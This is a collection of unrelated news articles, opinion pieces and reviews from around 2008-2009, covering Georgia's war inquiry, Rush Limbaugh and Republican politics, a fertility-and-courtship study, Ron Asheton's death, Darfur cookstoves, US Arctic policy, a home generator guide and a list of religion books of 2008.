Erosi Kitsmarishvili , a former envoy to Russia , was testifying at a parliamentary commission hearing into the war the breakaway Georgian region .
One lawmaker threw his pen at Mr Kitsmarishvili and then had to be restrained as he charged towards him .
Georgia maintains its assault on South Ossetia followed a Russian invasion .
' Saakashvili plans '
" Russia was ready for this war , but the Georgian leadership started the military action first , " Mr Kitsmarishvili told the commission on Tuesday .
He said he had this information " from high - ranking Georgian officials " .
However , he said he believed Georgia had been provoked into war by Russia .
Mr Kitsmarishvili has been an outspoken critic of the Georgian president since being replaced as ambassador to Moscow , the BBC's Tom Esslemont in Tbilisi says .
On Tuesday , the former envoy also claimed that Mr Saakashvili told him in March of plans to use force to retake Abkhazia - another Georgia 's rebel region .
He said the president had also told him he would move the Georgian capital to Abkhazia 's capital , Sukhumi , in August .
Several members of the bi-partisan commission and Georgian government officials described Mr Kitsmarishvili 's comments as " shameless " and " irresponsible " .
Georgia accuses Russia of sending troops and tanks into South Ossetia in the hours before Tbilisi launched its assault on the regional capital Tskhinvali on 7 August .
Moscow says it intervened only after Tbilisi began shelling the rebel region .
Russian forces ousted Georgian troops from South Ossetia during the five - day war .
Moscow still keeps thousands of its troops in South Ossetia and Abkhazia .
AMEN .
No , DOUBLE AMEN .
Rush Limbaugh made himself look like a complete loser , along with Sean Hannity by stating he wants Obama to fail .
Did he not get the memo on November 4th ?
The country , America needs him to succeed , so we the people will succeed .
This line of division would have been applauded , applicable Republican talk during the hey day of the Bush Administration , but it is totally wrong now .
There is no doubt that Bush - Cheney ruined this country and their Republican Party .
It was this party that did not stand up and challenge the many grevious and illegal offenses caused by that administration .
Instead of showing leadership the Republicans fell in line and was dictated by the White House .
They did everything that Bush - Cheney told them to do and now look where they are at ; out of power , in the weeds and irrelevant .
Barack Obama is absolutely right to call them out for continually using the Rush Limbaugh playbook .
Do they think that Rush Limbaugh is the savior to their party ?
If so , they are about to lose some more seats in 2010 .
" You ca n't just listen to Rush Limbaugh and get things done , " he told top GOP leaders , whom he had invited to the White House to discuss his nearly $ 1 trillion stimulus package .
One White House official confirmed the comment but said he was simply trying to make a larger point about bipartisan efforts .
" There are big things that unify Republicans and Democrats , " the official said .
" We should n't let partisan politics derail what are very important things that need to get done . "
There is a fundamental struggle going on here .
Rush Limbaugh with all his oxycotin glory is becoming insignificant to the Republican Party .
It was his rhetoric that did not help them in 2006 , remember the " Micheal J. Fox incident " which helped Claire McCaskill win in Missouri ?
Rush surely did not help himself nor his party with that behavior .
And do you think Rush was a help for McCain ?
Rush was totally ineffective in 2008 .
While Rush is watching Obama soar in solid red states by the recent polling numbers , he is losing his bully pulpit .
Oh , there is that 22 - 25 % that will listen to him to the end , but overall folks are tired of his nasty , divisive rants .
Like Bush , they are just tuning him out .
This is what the Republicans need to do in Washington , D.C. , but more importantly they need to find a way to win again and it ain't with the anti-immigrant , good old white boy , rhetoric of Rush Limbaugh .
As Obama justly told the Republicans firmly , " I Won " , he is also giving the Republicans a chance to get their act together if they want to work with him .
Obama did win , this country won , and the Republicans need to get over it .

For men whose chat - up lines are n’t working , it could simply be a case of bad timing .
Psychologists have determined that women are most likely to give their phone number to a male stranger when they are likeliest to get pregnant .
Researchers recruited handsome young men to experimentally hit on women on a street corner to determine whether fertility affects receptivity to male advances .
Large amounts of research have shown that women are more responsive to masculine voices , faces , and odours when they ’re fertile , but no studies have probed the obvious outcome of such inclinations , says Nicolas Guéguen , a psychologist at the University of South Brittany , France .
Advertisement
“ These studies did not focus on women ’s behaviour .
It ’s the first study to test the role of the menstrual cycle on courtship request , in a real social context and not in laboratory , ” he told New Scientist .
To bridge that gap , he asked five handsome 20 - year - old men – winnowed down from a larger group rated for attractiveness by 28 women – to ask unsuspecting females for a date .
Fleeting encounter
On sunny summer days , the hunks approached the first young woman they saw on a street corner and delivered a standard pick - up line :
“ Hello .
My name ’s Antoine .
I just wanted to say that I think you ’re really pretty .
I have to go to work this afternoon , and I was wondering if you would give me your phone number .
I ’ll phone you later and we can have a drink together someplace . ”
If she said yes , “ Antoine ” responded , “ See you soon , ” and left .
Rejections were given a similarly cheery standard response : “ Too bad .
It ’s not my day .
Have a nice afternoon ! ”
Less than a minute after the encounter , a female researcher approached the woman and clued her into the experimental nature of the encounter , asking her to fill out a short survey .
Questions gauged age , contraception use , days since her last period or pregnancy status – none of which measured her likely dismay at the deception .
After analyzing responses from 455 women – only 51 declined the survey – Guéguen noticed a couple of trends .
Fertile peak
Overall , 8.6 % of the women who filled out a survey gave out their phone numbers .
Rough odds , considering the men were judged as hunks .
Women off the pill accepted offers twice as often as women on the pill ( 5.8 % as opposed to 12 % ) , perhaps a reflection of the likelihood that women on the pill are more likely to have men in their lives than women not taking birth control .
A more interesting trend emerged when Guéguen analysed the data according to a women ’s fertility .
Among women off the pill , those in their fertile phase accepted 21.7 % of advances , while women in the midst of their periods gave out their numbers to just 7.8 % of men , a significant statistical difference that did not exist for women on the pill .
Guéguen is cautious in his interpretations , but the study seems to offer real - world behavioural support for studies showing that women are most receptive to advances when they are likely to get pregnant .
Nightclub analysis
Hormones could play a role , as estradiol ( a form of oestrogen ) and progesterone levels wax and wane during a woman ’s cycle , and most birth control pills contain progesterone .
But Guéguen worries that a woman ’s relationship status will confound such associations , since single women could be less likely to be on birth control .
To firm up the results , he is also testing the effect in an environment where men might have a better chance of winning a woman ’s heart , or at least her cellphone number
“ Twenty - year - old women were approached by 20 - year - old males in nightclubs and solicited to dance with them during the period when slow songs were played , ” Guéguen says .
Until this study comes out , guys may want to focus their attention on less personal cues to a women ’s interest .

Guitarist Ron Asheton of The Stooges was found dead at home today .
He was 60 .
Download the new Independent Premium app Sharing the full story , not just the headlines
Asheton 's distorted guitar was a hallmark of the Iggy Pop - led group 's late - 1960s and early - 1970s sound .
He was an original member of The Stooges , an influential protopunk band founded in 1967 .
His brother , Scott , was the band 's drummer .
He was named the 29th greatest guitarist of all time in 2003 by Rolling Stone magazine .
Police in Ann Arbor , Michigan , said there were no signs of foul play , and the death appeared to be of natural causes .
Officers discovered Asheton after they were called to his home by friend who had not heard from him in several days .
WASHINGTON ( CNN ) --
In Sudan 's Darfur region , where violence and genocide are rampant , women risk their lives every day performing tasks as seemingly mundane as seeking out firewood .
The $ 30 stoves help keep Darfur 's women safe by reducing their time away from the refugee camps .
But , from his suburban home , one Maryland teen has dedicated himself to making life a little safer for those women .
The United Nations estimates that 300,000 people have been slaughtered in the ongoing violence in the north African country .
Countless others have been forced out of their homes and are living in refugee camps .
People living in the camps are relatively safe , but there is danger for the women and young girls who leave the compounds in search of firewood to cook meals .
Firewood in the desert is scarce , and the women often have to walk up to seven hours to gather enough wood to bring back to their camps .
Some women have been targeted , sexually assaulted and killed .
Spencer Brodsky , 17 , learned about the violence and decided to raise money to purchase fuel - efficient stoves to send to Darfur .
The stoves burn 75 percent less firewood .
Brodsky reasons that if he can do something to keep Sudanese women in the camps , this would decrease the likelihood of violence .
" We need to be able to benefit them in any way that we can so they do n't have to be out as many times of their compound , " he said .
Watch Brodsky discuss the project »
Brodsky , who is Jewish , said his elders have compared the genocide in Darfur to the Holocaust .
He believes that his peers should not stand for such injustice in their lifetime .
" They always taught about what was happening in that region in that the social injustice that 's happening .
And how you know how people said during the Holocaust during World War II -- you know this can never happen again . "
At $ 30 per stove , Brodsky has raised enough money to ship 420 stoves to Darfur .
Make a donation
The project is a joint effort between Brodsky and CHF International , a nonprofit organization dedicated to improving the economic conditions of people in some of the most troubled regions of the world .
Naila Mohamed , leader of the stoves project at CHF International , has witnessed the reaction of Sudanese women when they receive the stoves .
" These women are so grateful for this initiative and actually thankful to the American people who are so passionate to let these women know that there is help out there , " Mohamed said .
Together , Brodsky and CHF International want to continue raising awareness around the world of the plight of the Sudanese .
No matter how old you are , you can make a difference by buying a stove , Brodsky said .
" The power of one .
The power of change and that we can make a difference .
Even though I may be only 17 and a teenager , I can make a difference . "

The processor is updated to the newer Core 2 Duo , the RAM to 2GB ( though still DDR2 ) , and most importantly the integrated graphics to Nvidia 's 9400 m unit .
In other words , the extra $ 300 you have to spend to get a unibody model gets you a nicer - looking laptop , slight bump in HDD space , faster RAM , a proprietary display port and not much else .
From the glass - half - full perspective this does mean that for once , $ 999 is all you 'll have to spend to get a perfectly capable , latest - gen MacBook .

Well : here 's a start .
From the perspective of intent , there does seem to me to be moral clarity between Israel and Hamas .
Hamas refuses to recognize Israel 's right to exist in peace ; Israel refuses to recognize Hamas ' right to exist as a legitimate polity in Gaza because Hamas does not recognize Israel 's right to exist .
Hamas also was the first to break a barely - held ceasefire recently .
There seems to me to be no question that Israel has the higher moral ground from the perspective of recent events .
At the same time , Israel 's actual resources of military and economic power far exceed Hamas's ; and its pulverization of Gaza has led to a huge imbalance between the victims of Hamas 's war on Israel and Israel 's war on Hamas .
The Palestinians are suffering something like ten times the trauma and deaths of Israelis .
What they have endured in Gaza for the past couple of years must also be taken into account .
It is not a function of appeasement or wimpiness or fondness for Jihadism that makes this conclusion inescapable .
It is simply being human .
And so you have an excruciating confluence of the questions of proportionality in a just war and asymmetry in the war against terrorism .
What renders the current awfulness particularly wrenching is that the immoral means Hamas uses are logical from the point of view of an entity that is committed to Israel 's destruction but not powerful enough to achieve it .
And the response of Israel is logical from the point of view of a Western country enduring constant terrorist bombardment .
Hence the never - ending argument in which both extremes reinforce themselves .
This is not , one remembers , a Likud government .
This is what the center left needs to do in Israel to stay in power at this point .
And it has the backing of Egypt .
Departing US president grasps at resources beyond Alaska – but scientists warn the move could accelerate global warming
The United States has declared its intention to exploit the vast oil and mineral wealth hidden below the Arctic circle by extending its " sovereign rights " over the seabed .
A detailed policy directive – issued a week before George Bush quits the White House – makes explicit the extent of US ambitions in the polar region beyond Alaska .
" The United States is an Arctic nation , with varied and compelling interests in that region , " the document – National Security Presidential Directive 66 – states in its introduction , while acknowledging " a growing awareness that the Arctic region is both fragile and rich in resources " .
There is a qualified acceptance of " the effects of climate change and increasing human activity in the Arctic region " but the main thrust of the paper concerns how the US can tap potential energy resources .
One of the main obstacles to staking a claim on the Arctic seafloor has been opposition in the Senate to ratification of the United Nations ' 1982 Law of the Sea Convention .
The White House implicitly urges senators to overcome residual suspicions of the UN in the interests of national security , environmental protection and business opportunity .
The US is one of the few nations not to have signed up to the agreement which allows countries to extend their control of the seabed from 200 miles to up to 350 miles beyond their coastline .
Ratification , it says , would define " with certainty the area of the Arctic seabed and subsoil in which the United States may exercise its sovereign rights over natural resources such as oil , natural gas , methane hydrates , minerals , and living marine species … "
Methane hydrates are solidified gases formed under great pressure and at low temperatures on the seafloor .
They have been identified as an extensive energy source in future , although some environmentalists have warned they could trigger runaway global warming .
The directive calls for " all actions necessary to establish the outer limit of the continental shelf appertaining to the United States , in the Arctic and in other regions , to the fullest extent permitted under international law . "
The paper sounds a note of scepticism about the extent of global warming .
" High levels of uncertainty remain concerning the effects of climate change and increased human activity in the Arctic , " it remarks .
" An understanding of the probable consequences of global climate variability and change on Arctic ecosystems is essential to guide the effective long - term management of Arctic natural resources and to address socioeconomic impacts of changing patterns in the use of natural resources . "
Two years ago a Russian submarine planted a flag on the seabed under the Arctic ice , intensifying the race for offshore Arctic resources .
The Russian government has commissioned detailed marine , geological work to determine the external border of the Russian continental shelf in the Arctic Ocean .
It is due to be completed by 2011 .
The US and Canada still have an unresolved boundary in the Beaufort Sea , north of Alaska , an area thought to be rich in oil and natural gas deposits .
The new US policy is binding on future administrations until replaced .
Britain has signalled that it will have lodged five claims on the Atlantic seabed with UN's Commission on the Limits of the Continental Shelf by May this year .
Its latest submission , covering the area Hatton / Rockall basin west of Scotland , is due to be handed in to the UN offices in New York shortly .
In my mind ’s eye , I can see Ronald Reagan , wearing wings and a Stetson , perched on a cloud and watching all the goings - on down here in his old earthly home .
Laughing , rolling his eyes and whacking his forehead over the absurdities he sees , he ’s watching his old political party as it twists itself into ever more complex knots , punctuated only by pauses to invoke the Gipper ’s name .
It ’s been said that God would be amazed by what his followers ascribe to him ; believe me , Reagan would be similarly amazed by what his most fervent admirers cite in their desire to be seen as true - blue Reaganites .
On the premise that simple is best , many Republicans have reduced their operating philosophy to two essentials :
First , government is bad ( it ’s “ the problem ” ) ; second , big government is the worst and small government is better ( although because government itself is bad , it may be assumed that small government is only marginally preferable ) .
This is all errant nonsense .
It is wrong in every conceivable way and violative of the Constitution , American exceptionalism , freedom , conservatism , Reaganism and common sense .
In America , government is ... us .
What is “ exceptional ” about America is the depth of its commitment to the principle of self - government ; we elect the government , we replace it or its members when they displease us , and by our threats or support , we help steer what government does .
A shocker : The Constitution , which we love for the limits it places on government power , not only constrains government , it empowers it .
Limited government is not no government .
And limited government is not “ small ” government .
Simply building roads , maintaining a military , operating courts , delivering the mail and doing other things specifically mandated by the Constitution for America ’s 300 million people make it impossible to keep government “ small . ”
It is boundaries that protect freedom .
Small governments can be oppressive , and large ones can diminish freedoms .
It is the boundaries , not the numbers , that matter .
What would Reagan think of this ?
Was n’t it he who warned that government is the problem ?
Well , permit me .
I directed the joint House - Senate policy advisory committees for the Reagan presidential campaign .
I was part of his congressional steering committee .
I sat with him in his hotel room in Manchester , N.H. , the night he won that state ’s all - important primary .
I knew him before he was governor of California and before I was a member of Congress .
Let me introduce you to Ronald Reagan .
Reagan , who spent 16 years in government , actually said this :
“ In the present crisis , ” referring specifically to the high taxes and high levels of federal spending that had marked the Carter administration , “ government is not the solution to our problem ; government is the problem . ”
He then went on to say : “ Now , so there will be no misunderstanding , it ’s not my intention to do away with government .
It is rather to make it work . ”
Government , he said , “ must provide opportunity . ”
He was not rejecting government , he was calling -- as Barack Obama did Tuesday -- for better management of government , for wiser decisions .
This is the difference between ideological advocacy and holding public office :
Having accepted partial responsibility for the nation ’s well - being , one assumes an obligation that goes beyond bumper - sticker slogans .
Certitude is the enemy of wisdom , and in office , it is wisdom , not certitude , that is required .
How , for example , should conservatives react to stimulus and bailout proposals in the face of an economic meltdown ?
The wall between government and the private sector is an essential feature of our democracy .
At the same time , if there is a dominant identifier of conservatism -- political , social , psychological -- it is prudence .
If proposals seem unworkable or unwise ( if they do not contain provisions for taxpayers to recoup their investment ; if they do not allow for taxpayers , as de facto shareholders , to insist on sound management practices ; if they would allow government officials to make production and pricing decisions ) , conservatives have a responsibility to resist .
But they also have an obligation to propose alternative solutions .
It is government ’s job -- Reagan again -- to provide opportunity and foster productivity .
With the nation in financial collapse , nothing is more imprudent -- more antithetical to true conservatism -- than to do nothing .
The Republican Party that is in such disrepute today is not the party of Reagan .
It is the party of Rush Limbaugh , of Ann Coulter , of Newt Gingrich , of George W. Bush , of Karl Rove .
It is not a conservative party , it is a party built on the blind and narrow pursuit of power .
Not too long ago , conservatives were thought of as the locus of creative thought .
Conservative think tanks ( full disclosure : I was one of the three founding trustees of the Heritage Foundation ) were thought of as cutting - edge , offering conservative solutions to national problems .
By the 2008 elections , the very idea of ideas had been rejected .
One who listened to Barry Goldwater ’s speeches in the mid-'60s , or to Reagan ’s in the ‘ 80s , might have been struck by their philosophical tone , their proposed ( even if hotly contested ) reformulation of the proper relationship between state and citizen .
Last year ’s presidential campaign , on the other hand , saw the emergence of a Republican Party that was anti-intellectual , nativist , populist ( in populism ’s worst sense ) and prepared to send Joe the Plumber to Washington to manage the nation ’s public affairs .
American conservatism has always had the problem of being misnamed .
It is , at root , the political twin to classical European liberalism , a freedoms - based belief in limiting the power of government to intrude on the liberties of the people .
It is the opposite of European conservatism ( which Winston Churchill referred to as reverence for king and church ) ; it is rather the heir to John Locke and James Madison , and a belief that the people should be the masters of their government , not the reverse ( a concept largely turned on its head by the George W. Bush presidency ) .
Over the last several years , conservatives have turned themselves inside out :
They have come to worship small government and have turned their backs on limited government .
They have turned to a politics of exclusion , division and nastiness .
Today , they wonder what went wrong , why Americans have turned on them , why they lose , or barely win , even in places such as Indiana , Virginia and North Carolina .
And , watching , I suspect Ronald Reagan is smacking himself on the forehead , rolling his eyes and wondering who in the world these clowns are who want so desperately to wrap themselves in his cloak .
Mickey Edwards is a former U.S. congressman , a lecturer at Princeton ’s Woodrow Wilson School and the author of “ Reclaiming Conservatism . ”
If you live in an area where power supplies are frequently interrupted , you may consider getting a generator .
However , if you never have to choose a generator , you may have no idea how to choose the right generator for your home .
By following some simple tips and taking into account the energy requirements of your home , finding a generator that can power your home during a power outage may be much simpler than you think .
Here are some tips to start looking for a generator .
Wattage and network connections
Before choosing a generator , you must select the items you want to power .
For example , if you want an electric generator to supply your home with electricity during an electrical outage , you probably want to save energy for light fitting at least .
But you may also want to turn on your TV , computer , game console , boiler and other electrical appliances in your home .
Note down the wattage needed for each of these items and add the values .
The generator you choose must eventually have a higher watt rate that exceeds this number .
You also need to think about whether you want to connect your generator to the main power source in your home .
Wiring up connection to the main power lines means that if electrical power is lost , the generator will automatically start so that you may notice a power failure .
With this option , professional training is recommended to install your generator .
However , if this installation cost exceeds your budget , you may need to get a generator that needs to be manually started .
In this case , the generator may be preferred to a gas or diesel model , because refueling the generator in the dark can be a daunting task and sometimes dangerous .
Standby or Portable
Another important decision you should make is whether you want a backup generator or a portable generator .
Stand - by generators are larger units that do not move nor provide more power .
Portable units can be transported where they are needed and require less fuel , but they also generate less power wattage .
If you have a large house or a large number of devices that need power , it is possible that the backup generator is the best choice for you .
If you need only a little power or if you want to use your generator for other purposes rather than emergency , the portable generator will be sufficient .
Regardless of your decision , remember to think about the wattage , where there is a wide range of energy options for each of the generators .
Fuel options
All generators require fuel , although what they need varies exactly from model to model .
The smaller generators generally operate using a power inverted engine , which is quieter and uses lead - free gas or a gas / oil mixture .
Larger generators often use propane instead .
Propane fuel is more expensive , but it can also sustain normal gas and is more available in major emergencies .
If you take into account the guidelines above , it will be easier to choose a generator for your home .
Also , remember to budget fuel and accessories such as the transfer key since they are necessary .
Be sure to test your generator at least once before you buy it to make sure it fits your needs .
Annual “ Best Book ” lists should usually be read as a review of the best publicity work of the year - the books that make the list , as wonderful as they may be , are most often those backed up by dedicated publicists .
Charles Taylor ’s monumental A Secular Age , for instance , one of only two nonfiction titles about religion featured on The New York Times ‘ 2008 100 Notable Books list , is the kind of very dense , academic study that normally would n’t even cross the Times ‘ radar .
But it ’s big , it ’s the culmination of a career , and its publisher , Belknap / Harvard University , put all of its considerable prestige behind its promotion - in 2007 , that is , when Harvard published the book .
The fact that the Times slipped the book onto its 2008 list is a clue that such lists are n’t so much a reflection of the best as of what the editors read and cared about that year . ”
That can lead to a certain amount of cronyism - books by Times contributors are especially well represented on the Times ‘ list - which is a problem when readers take listmakers too seriously .
But cronyism can also reflect schools of thought .
Looked at for what it is , the web of connections that underlie a “ best of ” list reveals a portrait of a certain circle ’s concerns , commitments , and fascinations .
So it is below .
I asked five of the writers I trust most - an anthropologist , a historian , a novelist , a journalist , and two media scholars - to share their choices for 2008 ’s most interesting texts that deal with religion .
I say texts because I told them they were free to choose from any media .
Being bookish sorts , they mostly stuck to printed pages between two hard covers , but TV , music , movies , and internet found poetry are represented below as well .
Following are their picks , and then mine .
They ’re the result of an arbitrary process - our selection from the relatively tiny sample of the year ’s new texts we saw - and a reflection of the multiple conversations that intersect at New York University ’s Center for Religion and Media , which is where I ’m writing from .
Much is missing from the list - my Islamic and Buddhist authorities let me down - and while Fucked Up ’s new album , The Chemistry of Common Life , will probably show up on some “ best of ” lists compiled by hardcore fans , other texts selected , such as Patton Dodd ’s “ poem ” “ Sally , ” would probably go unheralded were it not for this eccentric compilation of the year ’s most intriguing texts , a veritable Venn diagram of overlapping ideas , enthusiasms , and fellow traveling .
It ’s the most honest “ best of ” list you ’ll find .

Speaking in Tongues
Peter Manseau is the editor of Search : The Magazine of Science , Religion , and Culture , the author of a novel , Songs for the Butcher ’s Daughter , a memoir , Vows : The Story of a Priest , a Nun , and their Son , and co-author of Killing the Buddha : A Heretic ’s Bible .
No one speaks of a dying language without bordering on lament .
So it ’s no surprise that “ The Glories of Yiddish , ” Harold Bloom ’s review of Max Weinreich ’s 1973 two - volume History of the Yiddish Language ( Yale University Press ) in The New York Review of Books is an elegy .
What is surprising is the ground Bloom considers it necessary to cover to do justice to this particular dying language , which happens to be the language of his youth .
From Kafka to Kierkegaard , from Hamlet to Hasidism , in order to talk about this langauge that informed so much of American culture even as it was consumed by it , one needs to talk about the whole world .

A former Christian Science Monitor political reporter , Ariel Sabar , author of My Father ’s Paradise , grew up with a different dying language .
His father is among the last living native speakers of Aramaic , which until the middle years of the 20th century survived as the language of Kurdish Jews in Iraq .
Setting off to his father ’s homeland at the worst possible time , Sabar tells the story of Aramaic as well as the unique set of circumstances that brought his family to Los Angeles , where his father is now not only a scholar and preserver of the language of his raising , but occasionally shares his knowledge of Aramaic with Hollywood directors hungry to add a little language - of - Jesus mysticism to occult plot - lines .

The morning after the election , Beliefnet editor Patton Dodd did something that was as funny as it was smart :
He waded through status updates on Facebook looking for Christian responses to Obama ’s victory .
Lending anonymity to his sources ( admittedly odd considering Facebook exists for nearly the opposite reason ) , Dodd gave them all the same name .
The result is an intriguing , hydra - headed portrait of a mostly religious nation that is anything but monolithic .
He called it “ Sally “ :
Sally loves America .
Sally is sad that America is incredibly naive .
Sally just popped the champagne .
Sally is disappointed , but knows God is in control .

She ’s the author of Red -Hot and Righteous : The Urban Religion of The Salvation Army and co-editor of Faith in the Market : Religion and the Rise of Urban Commercial Culture .
Call me an ass - kisser , but my money is on Jeff Sharlet ’s The Family ( Harper ) as one of the year ’s best and most important books about religion and politics .
Sharlet ’s in - depth investigation of an elite group working at the intersection of traditional Christianity and free market capitalism suggests that the religious right is just a sideshow .
Few writers can pull off investigative journalism , historical research , and elegant storytelling .
Sharlet does all this with a story that a lot of people do n’t want to hear and others wo n’t believe .

Here ’s a sleep - inducing title : Women in the Church of God in Christ : Making a Sanctified World ( University of North Carolina ) - but do n’t let it dissuade you from reading Anthea Butler ’s new book .
Butler writes about lower class African - American Pentecostal women , a sadly understudied group .
Focusing on the experience of sanctification , and the concomitant “ dedication to both spiritual practices and temporal obedience , ” Butler looks at how belief shaped these women ’s understanding of self , community , and God , enabling them to “ negotiate for and obtain power ” in ways that defied expectations for women of their race and station .
Butler writes concisely and accessibly , telling stories of women you will be glad to have met .

She is the author of Of Body and Brush : Grand Sacrifice as Text / Performance in 18th Century China .
Re-Enchantment , Volume 7 of James Elkins ’ series called “ The Art Seminar ” ( Routledge ; edited with David Morgan ) revolves , dizzyingly , around the connections between religion and art .
Enemies ?
Friends ?
A cadaver replaced by a vampire ?
As with each series ’ volume , the book centers upon a literal seminar conversation among nine participants , in this case on April 17 , 2007 .
They ’ve each read the five short “ starting point ” essays , they talk for the record , and then 29 more people contribute “ assessments , ” some as short as one page , about their conversation .
The reader holds it all in her hand in 315 nifty , action - packed pages .
To quote Chris Parr quoting David Morgan : “ Here ’s the thing : Belief can be as sophisticated as art - this is something not many art - world inhabitants seem prepared to recognize . ”

At the risk of this seeming to be The David Morgan show , there ’s also Keywords in Religon , Media and Culture , edited by Morgan ( Routledge ) .
“ Keywords ” volumes abound in scholarly life and I have wondered why .
Then I was asked to contribute to this one , and realized that writing for such a monster actually provokes a kind of thoughtful condensation of all the damp , wispy thinking that was swirling around in my head .
Keywords books are not encyclopedic ; they are eccentric and carefully chosen for their concision in division of the topic .

Myth and Monolith
Julia Rabig is a historian at the University of Rochester Frederick Douglass Institute for African and African American Studies .
From Democratic
Party outreach to evangelical voters to the smackdown of Jeremiah Wright to Tucker Carlson ’s assertion that “ black churches are basically political organizations , ” we encountered a maelstrom of media references to the “ black church ” in 2008 .
For anyone who followed this coverage and questioned what such a monolithic term as “ the black church ” could accurately describe , I recommend two new books :
In Your Spirits Walks Beside Us : The Politics of Black Religion ( Belknap Harvard ) , Barbara Dianne Savage argues , “ Despite common usage , there is no such thing as the ‘ black church ’ …
Yet the ‘ black church ’ lives on precisely because it is political and cultural shorthand and an all - purpose stand - in for the dearth of other black institutions , especially in the twentieth century when large institutional responses to racial inequality were required . ”
This paradox is one of the three that animates twentieth century activists ’ and intellectuals ’ engagement with religion and helps explain the persistence of this troubled concept .
The others are explored through Savage ’s acute blend of intellectual history and biography : leaders such as Benjamin Mays , Carter G. Woodson , and Nannie Helen Burroughs argue across some of the most tumultuous decades in African - American history over the responsibilities of churches and the effectiveness of African Americans ’ religious commitments in the struggle for liberation .
*
Adele Oltman ’s Sacred Mission , Wordly Ambition : Black Christian Nationalism in the Age of Jim Crow ( University of Georgia ) blooms from a careful , revelatory reconstruction of the spiritual and economic lives of black Baptists in Savannah , Georgia into a critical mediation on the competing philosophies of late nineteenth - century black nationalism that upends the simplistic notions of accommodation and resistance through which Jim Crow - era black leadership is often described .
Her impressive range of sources - including church records that were nearly destroyed in a fire - support a compelling analysis of how the sacred and secular intertwined to create a foundation from which African Americans claimed citizenship rights .
But Oltman provocatively rejects the notion of a continuous line of influence from the churches she studies to those that animated the American Civil Rights Movement a half - century later .
The authority of the former had to give way , she argues , before the movement could flourish .

The Right Stuff
Kathryn Joyce , Web editor for the Revenue Watch Institute and a former co-editor of The Revealer , is the author of Quiverfull : Inside the Christian Patriarchy Movement .
Sarah Posner ’s FundamentaList for The American Prospect is an invaluable source in understanding the inner workings of the religious right , in Washington and across the country .
In God ’s Profits : Faith , Fraud , and the Republican Crusade ( Polipoint ) , she deftly dissects the financial doings - and more importantly , the financial methods - of religious right leaders waging perpetual culture war on their followers ’ dime .
She follows the money from televangelists and tax - exempt churches to some of the stranger and more mystical corners of evangelicaldom , and back again .

When the right - wing documentary film , Demographic Winter : The Decline of the Human Family ( Family First Foundation ) , premiered at the Heritage Foundation , its Mormon creators and evangelical - and Catholic - right backers declared the film ’s premise - that a slow apocalypse of aging and low birth rates is imminent due to liberal policies such as family planning and gay rights - “ the single most powerful force directing the fate and future of society . ”
I ’ve been a critic of the film and the so - called “ pro-family ” movement that birthed it , so it ’s unsurprising that I do n’t agree .
But I do think the film really does represent a powerful force in the future of the Christian right , which is smartly and actively combining forces across denominational and religious lines with a platform that precariously balances appeals to shared conservative “ Abrahamic faith ” values , exploitation of racial and cultural fears , and shifty “ social science ” arguments in favor of a traditionalist “ natural family . ”

Though Passionate Housewives Desperate for God , by Jennie Chancey and Stacy McDonald ( Vision Forum ) was published at the end of 2007 , I ’m sneaking it in to my 2008 list as a text that ’s emblematic of much of my reading this past year as I finished my research and writing on the self - described Christian Patriarchy and Quiverfull movements .
Chancey and McDonald are names little - known in mainstream culture , but within the growing world of “ complementarian ” Christianity which emphasizes “ biblical ” manhood and womanhood , they are acknowledged leaders of a lifestyle that champions the idea of husbands ’ spiritual and actual “ headship ” of their families , wives ’ submissiveness to their husbands in all matters , and women ’s readiness to bear as many children as God grants them .
Their book was published by the homeschooling ministry Vision Forum , which as a ministry , publishing house , Web site , and event series is a vital text about the purist edges of the Christian Right in itself .

The Family : The Secret Fundamentalism at the Heart of American Power ( Harper ) , by my friend and colleague Jeff Sharlet , is grounded in personal experience that establishes the members of the Family network not as stereotypes but as devotees to a strange and deeply flawed theology of power , and an historical scope that recalls a period of American history that conventional wisdom has forgotten .
Through doggedly persistent investigation and research , Sharlet has gone far beyond the the journalism that shoehorns complex and deep - rooted networks and belief systems into bite - sized truisms and familiar mainstream resolutions to the “ problem ” of America ’s fundamentalist history and reign .

Envy , or Yiddish in America
Jeff Sharlet , a contributing editor for Harper ’s and Rolling Stone , is the author of The Family and co-author of Killing the Buddha : A Heretic ’s Bible .
He publishes The Revealer at NYU ’s Center for Religion and Media .
My favorite new book of the year was Peter Manseau ’s astonishing novel Songs for the Butcher ’s Daughter , “ a Jewish novel that was waiting to be written , that needed to be written , ” as I noted , introducing an excerpt published on The Revealer .
“ An extraordinary novel , and Itsik Malpesh ” - Peter ’s protagonist , a Yiddish poet whose memoirs , translated by a character much like Peter , make up the bulk of the novel - “ is one of literature ’s most stunning achievements , ” declared Junot Díaz in his remarks for the John Sargent Sr. First Novel Prize , for which Peter was a finalist .
Peter and I have been talking about the great American Yiddish novel ( in English , of course ) we both believed was was hidden somewhere amidst the thousands of Yiddish volumes at the National Yiddish Book Center , where we first met and began working together in the late 1990s .
But I never thought for a second that Peter , the son of a Catholic priest and a nun ( see his family memoir , Vows , for that story ) would write it .
Chalk my shortsightedness up to both ethnic bias and professional envy .
Melvin Jules Bukiet , the brilliant author of my favorite Holocaust novel , After , wrote me an e-mail upon reading Peter ’s book in manuscript , which I quote in its entirety :
My favorite joke : Takes place at the Moscow Writer ’s Club .
All the literati have been there for decades .
The room is musty with their odor .
Enter the ephebe , pale , tender , clutching a manuscript , trembling .
He walks to the oldest , wisest , most venerable writer in the room and hands him the manuscript .
The room hushes .
The old writer glances at the pages .
He reads one , reads another .
For hours he turns the pages in utter silence .
Finally , he turns the last page and looks up at the rest of the writers who are on the edges of their chairs , awaiting his judgment .
“ Good news , ” he says .
“ It ’s shit .
” Unfortunately your friend Mr. Manseau ’s book does not fit into that category .
My God !
How could he !
The Butcher ’s Daughter is delirious .
I will have to outdo myself for a blurb .
Considering posing it in the form of a letter to the Elders of Zion in which I say what I have to say and wonder what we must do .
The answer is obvious : kill him .

There are more painful chronicles than Peter Trachtenberg ’s terrifying Book of Calamities ( Little , Brown ) - anthologies of lynchings , compilations of genocidal documents , black books of the Holocaust - but few that hurt on so many registers , from the mundane to the inconceivable , the personal to the political , the absurd to the outrageous , the stupid to the sad .
A partial inventory : a friend with cancer ; the author as junkie ; the Book of Job ; the dead of 9/11 ; a martyr and a lion ; Rwanda ; the Holocaust ; twins befriended by Trachtenberg who are afflicted by a disease that flays them alive , over and over , for 27 years ; Vietnam vets trapped in their own stories ; victims of AIDS in Calcutta , trapped in Mother Theresa ’s story ; another friend of the author , his head stuck in a plastic bag .
And yet , The Book of Calamities never wallows .
